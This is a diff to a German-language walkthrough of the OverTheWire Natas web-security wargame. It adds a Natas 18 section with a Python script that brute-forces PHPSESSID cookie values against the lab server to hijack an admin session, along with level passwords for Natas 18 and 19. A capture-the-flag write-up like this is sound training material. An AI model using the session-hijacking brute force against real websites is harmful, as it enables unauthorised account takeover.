@@ -289,7 +289,6 @@ while not hasFound:
                 hasFound = True
                 print("Password for Natas 16 is: "+found)
             break
-
 ```
 
 # Natas 16
@@ -339,7 +338,6 @@ while not hasFound:
             if len(found) >= 32:
                 hasFound = True
             break
-
 ```
 
 # Natas 17
@@ -392,11 +390,35 @@ while not hasFound:
                 hasFound = True
                 print("Password for Natas 18 is: "+found)
             break
-
 ```
 
 # Natas 18
 
 Zugriff:	[http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)
-Username: `natas17`
+Username: `natas18`
 Passwort: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP  `
+
+Session Hijacking Attack. Die PHPSESSID wird über den Cookie gesetzt. Diesen kann man beim request mitgeben. 
+
+```python
+import requests
+
+sessions = [x for x in range(1, 640)]
+for i in sessions:
+    print("Sniffing Session: " + str(i))
+    cookies = {'PHPSESSID': str(i)}
+    r = requests.post('http://natas18.natas.labs.overthewire.org/index.php',
+                      auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
+                      cookies=cookies)
+
+    if 'You are an admin.' in r.text:
+        print("Admin Session found. ID = "+str(i))
+        print(r.text)
+        break
+```
+
+# Natas 19
+
+Zugriff:	[http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)
+Username: `natas19`
+Passwort: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  `
